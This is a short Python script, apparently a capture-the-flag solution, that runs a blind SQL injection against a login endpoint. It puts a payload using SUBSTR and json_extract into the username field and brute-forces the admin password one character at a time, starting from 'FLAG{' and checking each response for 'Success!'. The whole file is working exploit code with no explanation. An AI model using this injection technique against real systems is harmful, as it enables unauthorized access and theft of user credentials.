import requests

def guess_next_char(base_url, password_guess, current_char):
    data = {
        "username": f"\") AS password, SUBSTR(json_extract(users, '$.admin.password'), 1, {len(password_guess) + 1}) AS password FROM db -- ",
        "password": password_guess + chr(current_char)
    }
    response = requests.post(base_url, data)
    # print(response.text)
    return 'Success!' in response.text

def find_admin_password(base_url, initial_guess="FLAG{"):
    password_guess = initial_guess

    while True:
        char_found = False

        for next_char in range(33, 127):  # Iterating through ASCII characters
            if guess_next_char(base_url, password_guess, next_char):
                password_guess += chr(next_char)
                print("Current Password Guess:", password_guess)
                char_found = True
                break

        if not char_found:
            break  # Break the loop if no more characters are found

    return password_guess

# Main execution
if __name__ == "__main__":
    URL = "http://10.113.184.121:10081/login"
    # URL = "http://127.0.0.1:3000/login"
    final_password = find_admin_password(URL)
    print("Final Password Guess:", final_password)
